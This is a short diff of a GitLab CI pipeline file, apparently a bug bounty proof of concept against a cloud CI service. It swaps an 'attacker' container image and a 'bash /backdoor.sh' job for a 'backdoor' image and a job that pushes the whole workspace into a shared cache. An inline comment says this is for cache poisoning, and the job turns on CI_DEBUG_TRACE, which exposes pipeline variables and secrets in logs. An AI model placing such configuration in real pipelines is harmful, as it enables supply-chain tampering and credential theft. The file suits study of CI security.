@@ -1,5 +1,14 @@
-default:
-  image: gcr.io/gcp-bugbounty/attacker
+image: gcr.io/gcp-bugbounty/backdoor
 
-rspec:
-  script: bash /backdoor.sh
+a:
+  script:
+  - echo "script"
+  - touch A
+  cache:
+    key: "$A"
+    policy: push #or push if you like to poison
+    paths:
+      - .
+  variables:
+    CI_DEBUG_TRACE: "true"
+
